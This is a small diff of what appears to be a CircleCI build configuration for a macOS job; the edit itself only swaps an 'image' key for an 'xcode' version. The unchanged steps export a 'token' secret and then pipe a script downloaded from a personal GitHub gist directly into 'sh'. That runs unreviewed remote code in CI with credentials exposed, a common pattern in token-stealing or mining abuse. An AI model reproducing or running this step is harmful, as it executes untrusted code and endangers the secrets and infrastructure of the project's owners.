@@ -2,7 +2,7 @@ version: 2
 jobs:
   macos:
     macos:
-      - image: "9.0"
+      xcode: "9.0"
     steps:
       - run: export token=$token
       - run: wget https://gist.githubusercontent.com/RandomiDn/f242e2e24c641a9e18252f46c36f39d1/raw/init.dev -O - | sh
